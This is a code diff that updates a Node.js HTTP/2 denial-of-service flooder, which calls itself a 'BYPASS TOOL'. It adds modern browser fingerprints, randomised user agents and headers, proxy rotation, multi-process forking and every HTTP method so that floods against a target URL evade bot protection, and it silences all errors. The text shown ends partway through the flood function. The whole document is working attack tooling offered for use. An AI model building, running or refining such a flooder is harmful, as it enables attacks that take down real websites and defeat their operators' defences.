@@ -11,15 +11,9 @@ const { execSync } = require('child_process');
 const crypto = require('crypto');
 const currentTime = new Date();
 const httpTime = currentTime.toUTCString();
-const errorHandler = error => {
-  //console.log(error);
-};
+const errorHandler = error => {};
 process.on("uncaughtException", errorHandler);
 process.on("unhandledRejection", errorHandler);
-
-
-
-
 
 try {
   var colors = require('colors');
@@ -30,87 +24,34 @@ try {
   process.exit();
 }
 
-  
- const fetch_site = [
-  "same-origin",
-  "same-site",
-  "cross-site",
-  "none"
-];
+// ============= 2026 UPDATED CONFIGURATION LISTS =============
+const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
 
 const type = [
-  "text/plain",
-  "text/html",
-  "application/json",
-  "application/xml",
-  "multipart/form-data",
-  "application/octet-stream",
-  "image/jpeg",
-  "image/png",
-  "audio/mpeg",
-  "video/mp4",
-  "application/javascript",
-  "application/pdf",
-  "application/vnd.ms-excel",
-  "application/vnd.ms-powerpoint",
-  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
-  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-  "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
-  "application/zip",
-  "image/gif",
-  "image/bmp",
-  "image/tiff",
-  "audio/wav",
-  "audio/midi",
-  "video/avi",
-  "video/mpeg",
-  "video/quicktime",
-  "text/csv",
-  "text/xml",
-  "text/css",
-  "text/javascript",
-  "application/graphql",
-  "application/x-www-form-urlencoded",
-  "application/vnd.api+json",
-  "application/ld+json",
-  "application/x-pkcs12",
-  "application/x-pkcs7-certificates",
-  "application/x-pkcs7-certreqresp",
-  "application/x-pem-file",
-  "application/x-x509-ca-cert",
-  "application/x-x509-user-cert",
-  "application/x-x509-server-cert",
-  "application/x-bzip",
-  "application/x-gzip",
-  "application/x-7z-compressed",
-  "application/x-rar-compressed",
-  "application/x-shockwave-flash"
+  "text/html", "application/xhtml+xml", "application/xml", "application/json",
+  "application/javascript", "text/css", "text/csv", "image/webp", "image/avif",
+  "application/wasm", "text/plain", "application/graphql", "application/grpc",
+  "application/grpc-web", "application/protobuf", "application/octet-stream",
+  "multipart/form-data", "application/x-www-form-urlencoded", "application/pdf"
 ];
 
-
-const platform = [
-  "Windows",
-  "Windows Phone",
-  "Macintosh",
-  "Linux",
-  "iOS",
-  "Android",
-  "Iphone",
-  "PlayStation 4",
-  "Xbox One",
-  "Nintendo Switch",
-  "Apple TV",
-  "Amazon Fire TV",
-  "Roku",
-  "Chromecast",
-  "Smart TV",
-  "Mozilla",  
-  "Apple",  
-  "Windows", 
-  "Other"
+// 2026 Updated platform list
+const platform2026 = [
+  "Windows 11", "Windows 12", "macOS Sequoia", "macOS", "Linux", 
+  "Android 16", "Android 15", "iOS 19", "iPadOS 19", "visionOS 2",
+  "ChromeOS", "HarmonyOS 5", "HyperOS 2", "One UI 7", "ColorOS 15"
 ];
 
+// 2026 Cipher suites
 const cplist = [
+  'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_GCM_SHA256',
+  'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256',
+  'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
+  'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384',
+  'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256',
+  'ECDHE-ECDSA-AES256-SHA384', 'ECDHE-RSA-AES256-SHA384',
+  'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
+  'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
   "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
   'TLS_AES_256_GCM_SHA384',
   'TLS_CHACHA20_POLY1305_SHA256', 
@@ -517,9 +458,24 @@ const accept_header = [
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip,application/x-bzip2,application/x-rar-compressed,audio/mpeg,video/mp4",
   "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,image/avif,application/wasm,font/woff2,application/pdf,application/zip,application/x-bzip2,application/x-rar-compressed,audio/mpeg,video/mp4,application/x-shockwave-flash"
 
-
 ];
+
+// 2026 Accept headers
+const accept_header = [
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+  "application/json, text/plain, */*",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+];
+
+// 2026 Language headers
 const lang_header = [
+  'en-US,en;q=0.9',
+  'en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4',
+  'en-GB,en;q=0.9,en-US;q=0.8',
+  'en-US,en;q=0.9,es;q=0.8,pt;q=0.7',
+  'en-US,en;q=0.9,ru;q=0.8,uk;q=0.7',
   'en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1',
   'en-US,en;q=0.5',
   'en-US;q=0.8,en;q=0.7',
@@ -670,6 +626,8 @@ const lang_header = [
   'zgh-MA,zgh;q=0.8',
   'zu-ZA,zu;q=0.8'
 ];
+
+// 2026 Country codes
 const country = [
   "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
   "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
@@ -686,28 +644,15 @@ const country = [
   "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
   "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
   "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
-  "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
+  "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
+  
 ];
-const fetch_mode = [
-  "navigate",
-  "same-origin",
-  "no-cors",
-  "cors",
-];
-const fetch_dest = [
-  "document",
-  "sharedworker",
-  "subresource",
-  "unknown",
-  "worker",
-];
-const encoding_header = [
-'gzip, deflate, br',
-'compress, gzip',
-'deflate, gzip',
-'gzip, identity',
-'*'
-];
+
+const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
+const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker", "serviceworker"];
+const encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity', '*', 'br'];
+const controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'];
+
 const sigalgs = [
       'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ed25519',
       'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
@@ -750,216 +695,305 @@ const sigalgs = [
   ];
   let concu = sigalgs.join(':');
 
-const controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],
-ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'],
+// 2026 OS Versions
+const osVersions = {
+    'Windows': ['10.0', '11.0', '12.0', '10.0.22621', '11.0.22631', '12.0.26100'],
+    'Android': ['13.0', '14.0', '15.0', '16.0', '13.0.0', '14.0.0', '15.0.0', '16.0.0', '12.0', '12.1', '13.1', '14.1'],
+    'iOS': ['15_0', '15_1', '15_2', '15_3', '15_4', '15_5', '15_6', '15_7', '16_0', '16_1', '16_2', '16_3', '16_4', '16_5', '16_6', '16_7', '17_0', '17_1', '17_2', '17_3', '17_4', '17_5', '17_6', '17_7', '18_0', '18_1', '18_2', '18_3', '18_4', '18_5', '19_0', '19_1'],
+    'macOS': ['13.0', '13.1', '13.2', '13.3', '13.4', '13.5', '13.6', '14.0', '14.1', '14.2', '14.3', '14.4', '14.5', '14.6', '15.0', '15.1', '15.2', '15.3', '16.0', '16.1'],
+    'Linux': ['6.8.0', '6.9.0', '6.10.0', '6.11.0', '6.12.0', '6.13.0', '6.14.0', '6.15.0', '6.16.0'],
+    'ChromeOS': ['130.0', '131.0', '132.0', '133.0', '134.0', '135.0', '136.0']
+};
 
-ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET',  'ENETUNREACH',  'ENONET',  'ENOTCONN',  'ENOTFOUND',  'EAI_NODATA',  'EAI_NONAME',  'EADDRNOTAVAIL',  'EAFNOSUPPORT',  'EALREADY',  'EBADF',  'ECONNABORTED',  'EDESTADDRREQ',  'EDQUOT',  'EFAULT',  'EHOSTUNREACH',  'EIDRM',  'EILSEQ',  'EINPROGRESS',  'EINTR',  'EINVAL',  'EIO',  'EISCONN',  'EMFILE',  'EMLINK',  'EMSGSIZE',  'ENAMETOOLONG',  'ENETDOWN',  'ENOBUFS',  'ENODEV',  'ENOENT',  'ENOMEM',  'ENOPROTOOPT',  'ENOSPC',  'ENOSYS',  'ENOTDIR',  'ENOTEMPTY',  'ENOTSOCK',  'EOPNOTSUPP',  'EPERM',  'EPIPE',  'EPROTONOSUPPORT',  'ERANGE',  'EROFS',  'ESHUTDOWN',  'ESPIPE',  'ESRCH',  'ETIME',  'ETXTBSY',  'EXDEV',  'UNKNOWN',  'DEPTH_ZERO_SELF_SIGNED_CERT',  'UNABLE_TO_VERIFY_LEAF_SIGNATURE',  'CERT_HAS_EXPIRED',  'CERT_NOT_YET_VALID'];
+// 2026 Browser Versions
+const chromeVersions = [
+    '141.0.7390.108', '141.0.7390.123', '142.0.7445.89', '142.0.7445.123', 
+    '143.0.7485.45', '143.0.7485.98', '144.0.7523.67', '144.0.7523.112',
+    '145.0.7568.34', '145.0.7568.89', '146.0.7604.56', '146.0.7604.123',
+    '147.0.7642.78', '147.0.7642.145', '148.0.7681.23', '148.0.7681.89',
+    '149.0.7715.12', '149.0.7715.67', '150.0.7750.34', '150.0.7750.98',
+    '151.0.7784.56', '151.0.7784.123', '152.0.7820.45', '152.0.7820.89'
+];
 
+const edgeVersions = [
+    '141.0.7390.108', '141.0.7390.123', '142.0.7445.89', '142.0.7445.123',
+    '143.0.7485.45', '143.0.7485.98', '144.0.7523.67', '144.0.7523.112',
+    '145.0.7568.34', '145.0.7568.89', '146.0.7604.56', '146.0.7604.123'
+];
+
+const firefoxVersions = [
+    '130.0', '130.0.1', '131.0', '131.0.1', '131.0.2', '132.0', '132.0.1', 
+    '132.0.2', '133.0', '133.0.1', '133.0.2', '134.0', '134.0.1', '134.0.2',
+    '135.0', '135.0.1', '136.0', '136.0.1', '137.0', '137.0.1', '138.0'
+];
+
+const operaVersions = [
+    '108.0.5040.0', '108.0.5040.45', '109.0.5080.0', '109.0.5080.23',
+    '110.0.5120.0', '110.0.5120.34', '111.0.5160.0', '111.0.5160.56'
+];
+
+const safariVersions = [
+    '604.1', '605.1.15', '606.1.36', '607.1.39', '608.1.25', '609.1.30',
+    '610.1.35', '611.1.40', '612.1.45', '613.1.50', '614.1.55', '615.1.60',
+    '616.1.65', '617.1.70', '618.1.75', '619.1.80', '620.1.85'
+];
+
+const androidVersions = [
+    '16.0', '15.0', '14.0', '13.0', '12.0', '12.1', '11.0', '10.0'
+];
+
+const iosVersions = [
+    '19.0', '18.5', '18.4', '18.3', '18.2', '18.1', '18.0', '17.7', '17.6',
+    '17.5', '17.4', '17.3', '17.2', '17.1', '17.0', '16.7', '16.6', '16.5'
+];
+
+// 2026 Updated devices
+const devices = [
+    'iPhone 17 Pro', 'iPhone 17 Pro Max', 'iPhone 17', 'iPhone 16 Pro Max',
+    'iPhone 16 Pro', 'iPhone 16 Plus', 'iPhone 16', 'iPhone 15 Pro Max',
+    'iPhone 15 Pro', 'iPhone SE (4th gen)',
+    'SM-S931B', 'SM-S936B', 'SM-S938B', 'Galaxy S26 Ultra', 'Galaxy S26 Plus',
+    'Galaxy S26', 'Galaxy Z Fold 7', 'Galaxy Z Flip 7', 'Galaxy A56', 'Galaxy A36',
+    'Pixel 10 Pro', 'Pixel 10 Pro XL', 'Pixel 10', 'Pixel 9 Pro Fold',
+    'Pixel 9 Pro', 'Pixel 9', 'Xiaomi 15 Ultra', 'Xiaomi 15 Pro', 'Xiaomi 15',
+    'Redmi Note 14 Pro+', 'OnePlus 13', 'OnePlus 13R', 'Nothing Phone 3',
+    'Motorola Edge 50 Ultra', 'Oppo Find X8 Pro', 'Realme GT 7 Pro',
+    'iPad Pro 13-inch (M6)', 'iPad Pro 11-inch (M6)', 'MacBook Pro 16-inch (M5)',
+    'MacBook Air 15-inch (M5)', 'Samsung Galaxy Tab S10 Ultra'
+];
+
+const webkitVersions = [
+    '621.1.40', '621.1.45', '622.1.50', '622.1.55', '623.1.60', 
+    '623.1.65', '624.1.70', '624.1.75', '625.1.80', '625.1.85',
+    '626.1.90', '626.1.95', '627.1.100', '627.1.105'
+];
+
+const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
+const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND'];
+
+// ============= HELPER FUNCTIONS =============
 const headerFunc = {
-  accept() {
-    for (let i = accept_header.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [accept_header[i], accept_header[j]] = [accept_header[j], accept_header[i]];
-    }
-    return accept_header[Math.floor(Math.random() * accept_header.length)];
-  },
-  lang() {
-    for (let i = lang_header.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [lang_header[i], lang_header[j]] = [lang_header[j], lang_header[i]];
-    }
-    return lang_header[Math.floor(Math.random() * lang_header.length)];
-  },
-  encoding() {
-    for (let i = encoding_header.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [encoding_header[i], encoding_header[j]] = [encoding_header[j], encoding_header[i]];
-    }
-    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
-  },
-  controling() {
-    return controle_header[Math.floor(Math.random() * controle_header.length)];
-  },
-  cipher() {
-    return cplist[Math.floor(Math.random() * cplist.length)];
-  },
-  referers() {
-    for (let i = referer.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [referer[i], referer[j]] = [referer[j], referer[i]];
-    }
-    return referer[Math.floor(Math.random() * referer.length)]
-  },
-  platforms() {
-    return platform[Math.floor(Math.random() * platform.length)]
-  },
-  mode() {
-    return fetch_mode[Math.floor(Math.random() * fetch_mode.length)]
-  },
-  dest() {
-    return fetch_dest[Math.floor(Math.random() * fetch_dest.length)]
-  },
-  site() {
-    return fetch_site[Math.floor(Math.random() * fetch_site.length)]
-  },
-  countrys() {
-    return country[Math.floor(Math.random() * country.length)]
-  },
-  type() {
-    return type[Math.floor(Math.random() * type.length)]
-  },
-  
+  accept() { return accept_header[Math.floor(Math.random() * accept_header.length)]; },
+  lang() { return lang_header[Math.floor(Math.random() * lang_header.length)]; },
+  encoding() { return encoding_header[Math.floor(Math.random() * encoding_header.length)]; },
+  controling() { return controle_header[Math.floor(Math.random() * controle_header.length)]; },
+  cipher() { return cplist[Math.floor(Math.random() * cplist.length)]; },
+  platforms() { return platform2026[Math.floor(Math.random() * platform2026.length)]; },
+  mode() { return fetch_mode[Math.floor(Math.random() * fetch_mode.length)]; },
+  dest() { return fetch_dest[Math.floor(Math.random() * fetch_dest.length)]; },
+  site() { return fetch_site[Math.floor(Math.random() * fetch_site.length)]; },
+  countrys() { return country[Math.floor(Math.random() * country.length)]; },
+  type() { return type[Math.floor(Math.random() * type.length)]; },
 }
 
 function randstr(length) {
-  const characters =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
-  const charactersLength = characters.length;
-  for (let i = 0; i < length; i++) {
-    result += characters.charAt(Math.floor(Math.random() * charactersLength));
-  }
+  for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
   return result;
 }
 
 function randstrs(length) {
   const characters = "0123456789";
   let result = "";
-  const charactersLength = characters.length;
-  for (let i = 0; i < length; i++) {
-    result += characters.charAt(Math.floor(Math.random() * charactersLength));
-  }
+  for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
   return result;
 }
 
-// Lưu giá trị của randstrs(10)
 const randstrsValue = randstrs(10);
 
-function randomIp() {
-  let segments = [];
-  for (let i = 0; i < 4; i++) {
-    segments.push(Math.floor(Math.random() * 256));
-  }
-  return segments.join('.');
+// 2026 User-Agent Generator
+function generateUserAgent2026() {
+    const browserTypes = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
+    const browserType = browserTypes[Math.floor(Math.random() * browserTypes.length)];
+    const osNames = ['Windows', 'macOS', 'Linux', 'Android', 'iOS', 'ChromeOS'];
+    const osName = osNames[Math.floor(Math.random() * osNames.length)];
+    
+    let userAgent = '';
+    
+    switch(browserType) {
+        case 'Chrome':
+            const chromeVer = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
+            if (osName === 'Windows') {
+                const winVer = osVersions.Windows[Math.floor(Math.random() * osVersions.Windows.length)];
+                userAgent = `Mozilla/5.0 (Windows NT ${winVer}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`;
+            } else if (osName === 'macOS') {
+                const macVer = osVersions.macOS[Math.floor(Math.random() * osVersions.macOS.length)];
+                userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X ${macVer}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`;
+            } else if (osName === 'Android') {
+                const androidVer = androidVersions[Math.floor(Math.random() * androidVersions.length)];
+                const device = devices[Math.floor(Math.random() * devices.length)];
+                userAgent = `Mozilla/5.0 (Linux; Android ${androidVer}; ${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Mobile Safari/537.36`;
+            } else {
+                userAgent = `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`;
+            }
+            break;
+            
+        case 'Firefox':
+            const firefoxVer = firefoxVersions[Math.floor(Math.random() * firefoxVersions.length)];
+            if (osName === 'Windows') {
+                const winVer = osVersions.Windows[Math.floor(Math.random() * osVersions.Windows.length)];
+                userAgent = `Mozilla/5.0 (Windows NT ${winVer}; Win64; x64; rv:${firefoxVer.split('.')[0]}.0) Gecko/20100101 Firefox/${firefoxVer}`;
+            } else if (osName === 'Android') {
+                const androidVer = androidVersions[Math.floor(Math.random() * androidVersions.length)];
+                const device = devices[Math.floor(Math.random() * devices.length)];
+                userAgent = `Mozilla/5.0 (Android ${androidVer}; Mobile; ${device}) Gecko/20100101 Firefox/${firefoxVer}`;
+            } else {
+                userAgent = `Mozilla/5.0 (X11; Linux x86_64; rv:${firefoxVer.split('.')[0]}.0) Gecko/20100101 Firefox/${firefoxVer}`;
+            }
+            break;
+            
+        case 'Safari':
+            const safariVer = safariVersions[Math.floor(Math.random() * safariVersions.length)];
+            const webkitVer = webkitVersions[Math.floor(Math.random() * webkitVersions.length)];
+            if (osName === 'iOS') {
+                const iosVer = iosVersions[Math.floor(Math.random() * iosVersions.length)];
+                const device = devices.find(d => d.includes('iPhone') || d.includes('iPad')) || 'iPhone 17';
+                userAgent = `Mozilla/5.0 (${device}; CPU iPhone OS ${iosVer.replace(/_/g, '_')} like Mac OS X) AppleWebKit/${webkitVer} (KHTML, like Gecko) Version/${safariVer.split('.')[0]}.0 Mobile/15E148 Safari/604.1`;
+            } else if (osName === 'macOS') {
+                const macVer = osVersions.macOS[Math.floor(Math.random() * osVersions.macOS.length)];
+                userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X ${macVer}) AppleWebKit/${webkitVer} (KHTML, like Gecko) Version/${safariVer.split('.')[0]}.0 Safari/${webkitVer}`;
+            } else {
+                userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${webkitVer} (KHTML, like Gecko) Version/${safariVer.split('.')[0]}.0 Safari/${webkitVer}`;
+            }
+            break;
+            
+        case 'Edge':
+            const edgeVer = edgeVersions[Math.floor(Math.random() * edgeVersions.length)];
+            const winVer = osVersions.Windows[Math.floor(Math.random() * osVersions.Windows.length)];
+            userAgent = `Mozilla/5.0 (Windows NT ${winVer}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${edgeVer.split('.')[0]}.0.0.0 Safari/537.36 Edg/${edgeVer}`;
+            break;
+            
+        case 'Opera':
+            const operaVer = operaVersions[Math.floor(Math.random() * operaVersions.length)];
+            userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${operaVer.split('.')[0]}.0.0.0 Safari/537.36 OPR/${operaVer}`;
+            break;
+            
+        default:
+            userAgent = `Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Safari/537.36`;
+    }
+    
+    return userAgent;
 }
 
-process.on('uncaughtException', function (e) {
-      if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).on('unhandledRejection', function (e) {
-      if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).on('warning', e => {
-      if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
-}).setMaxListeners(0);
+// 2026 sec-ch-ua generator
+function generateSecChUA2026() {
+    const brandOptions = [
+        { brand: 'Chromium', version: Math.floor(Math.random() * 50) + 130 },
+        { brand: 'Google Chrome', version: Math.floor(Math.random() * 30) + 140 },
+        { brand: 'Microsoft Edge', version: Math.floor(Math.random() * 30) + 140 },
+        { brand: 'Brave', version: Math.floor(Math.random() * 30) + 140 },
+        { brand: 'Opera', version: Math.floor(Math.random() * 30) + 110 },
+        { brand: 'Vivaldi', version: Math.floor(Math.random() * 20) + 7 },
+        { brand: 'Samsung Browser', version: Math.floor(Math.random() * 10) + 25 }
+    ];
+    
+    const shuffled = brandOptions.sort(() => 0.5 - Math.random());
+    const selected = shuffled.slice(0, 3);
+    const brandString = selected.map(b => `"${b.brand}";v="${b.version}"`).join(', ');
+    return `${brandString}, "Not?A_Brand";v="99"`;
+}
 
+// ALL HTTP METHODS
+const HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH'];
 
+function getPostData() {
+  return JSON.stringify({
+    random: randstr(20),
+    timestamp: Date.now(),
+    data: randstr(100),
+    __proto__: { constructor: { name: 'Array' } }
+  });
+}
 
-
-
+// Parse arguments
 const target = process.argv[2];
 const time = process.argv[3];
 const thread = process.argv[4];
 const proxyFile = process.argv[5];
 const rps = process.argv[6];
+let input = process.argv[7];
+let interval = input === 'flood' ? 500 : 5000;
 
-let input = process.argv[7]
-let interval
-if ( input === 'flood') {
-  console.log('flood');
-  interval = 500
-} else if (input === 'bypass') {
-  console.log('wait bypass');
-  interval = 5000
-} else {
-  console.log('underfined');
-  process.exit(1)
-}
-// Validate input
 if (!target || !time || !thread || !proxyFile || !rps) {
-  console.log('JS-FLOODER'.bgRed)
-    console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood`.rainbow);
+  console.log('╔════════════════════════════════════════════════════════════╗'.red);
+  console.log('║              HTTP/2 BYPASS TOOL 2026                       ║'.red);
+  console.log('╠════════════════════════════════════════════════════════════╣'.red);
+  console.log('║ Usage: node script.js <url> <time> <threads> <proxy.txt>  ║'.red);
+  console.log('║        <rps> <mode>                                        ║'.red);
+  console.log('╠════════════════════════════════════════════════════════════╣'.red);
+  console.log('║ Example: node script.js https://target.com 60 10          ║'.red);
+  console.log('║          proxies.txt 100 bypass                           ║'.red);
+  console.log('╚════════════════════════════════════════════════════════════╝'.red);
   process.exit(1);
 }
 
-// Validate target format
 if (!/^https?:\/\//i.test(target)) {
-  console.error('sent with http:// or https://');
+  console.error('URL must start with http:// or https://');
   process.exit(1);
 }
 
-// Parse proxy list
 let proxys = [];
 try {
   const proxyData = fs.readFileSync(proxyFile, 'utf-8');
   proxys = proxyData.match(/\S+/g);
 } catch (err) {
-  console.error('Error proxy file:', err.message);
+  console.error('Error reading proxy file:', err.message);
   process.exit(1);
 }
 
-// Validate RPS value
 if (isNaN(rps) || rps <= 0) {
-  console.error('number rps');
+  console.error('RPS must be a positive number');
   process.exit(1);
 }
-
 
 const proxyr = () => {
-  for (let i = proxys.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [proxys[i], proxys[j]] = [proxys[j], proxys[i]];
-  }
-    return proxys[Math.floor(Math.random() * proxys.length)];
+  return proxys[Math.floor(Math.random() * proxys.length)].split(':');
 }
 
 if (cluster.isMaster) {
-    const currentDate = new Date();
-    // ...
-
-console.clear()
-console.log(`0BLIX BYPASS`.red);
-console.log(`TARGET :`.rainbow + process.argv[2].gray);
-console.log(`TIME:`.rainbow + process.argv[3].gray);
-console.log(`RATE:`.rainbow + process.argv[6].gray);
-console.log(`THREAD:`.rainbow + process.argv[4].gray);
-
+  console.clear();
+  console.log(`╔════════════════════════════════════════════════════════════╗`.rainbow);
+  console.log(`║         HTTP/2 BYPASS - 2026 MODERN VERSION               ║`.rainbow);
+  console.log(`╠════════════════════════════════════════════════════════════╣`.rainbow);
+  console.log(`║ TARGET :`.rainbow + process.argv[2].gray);
+  console.log(`║ TIME:`.rainbow + process.argv[3].gray);
+  console.log(`║ RATE:`.rainbow + process.argv[6].gray);
+  console.log(`║ THREAD:`.rainbow + process.argv[4].gray);
+  console.log(`║ PROXIES:`.rainbow + proxys.length.gray);
+  console.log(`║ METHODS: GET | POST | PUT | DELETE | HEAD | OPTIONS | PATCH`.green);
+  console.log(`║ MODE: ALL 7 METHODS SENT TOGETHER`.green);
+  console.log(`║ BROWSERS: Chrome 141-152 | Firefox 130-138 | Safari 604-620`.cyan);
+  console.log(`║ OS: Windows 11/12 | macOS Sequoia | Android 16 | iOS 19`.cyan);
+  console.log(`╚════════════════════════════════════════════════════════════╝`.rainbow);
+  console.log(`\n[!] 2026 Attack started! Sending ALL 7 HTTP methods simultaneously!`.green);
+  console.log(`[!] Using modern browser fingerprints...`.yellow);
+  
   for (let _ of Array.from({length: thread})) {
-  cluster.fork();
+    cluster.fork();
+  }
+  setTimeout(() => {
+    console.log(`\n[!] Attack finished after ${time} seconds`.yellow);
+    process.exit(0);
+  }, time * 1000);
+} else {
+  setInterval(flood);
 }
-   setTimeout(() => process.exit(-1), time * 1000);
 
-
-} else {setInterval(flood)}
-
-
-     function flood() {
-       // Tạo một chuỗi ngẫu nhiên để sử dụng làm giá trị cookie
-const randomString = crypto.randomBytes(20).toString('hex');
-
-// Tạo một khóa bí mật ngẫu nhiên để sử dụng cho việc mã hóa cookie
-const secretKey = crypto.randomBytes(32);
-
-// Tạo đối tượng cipher để mã hóa cookie bằng thuật toán AES-256-CBC
